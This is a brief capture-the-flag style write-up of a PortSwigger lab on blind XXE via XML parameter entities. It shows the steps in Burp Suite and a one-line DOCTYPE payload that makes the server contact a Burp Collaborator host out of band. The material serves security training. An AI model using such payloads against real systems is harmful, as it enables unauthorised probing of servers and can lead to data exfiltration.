## Lab Description :

![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/0994c9c8-ca9c-4978-9348-56831a2c324f)

## Solution :

Visit a product page, click "Check stock" and intercept the resulting POST request in Burp Suite Professional.

![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/e4c84648-24d3-406f-8f85-404223352b57)

Insert the following external entity definition in between the XML declaration and the stockCheck element. Right-click and select "Insert Collaborator payload" to insert a Burp Collaborator subdomain where indicated:

```xml
<!DOCTYPE stockCheck [<!ENTITY % xxe SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN"> %xxe; ]>
```

![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/d03f5c3b-aeed-47a3-a2ad-ab6447f0fbc6)

Go to the Collaborator tab, and click "Poll now". If you don't see any interactions listed, wait a few seconds and try again. You should see some DNS and HTTP interactions that were initiated by the application as the result in our payload.

![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/84968e64-241b-40d1-9a99-45402066192e)

Lab solved.

![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/9417b260-bac8-4a56-8ada-acf51f185c55)
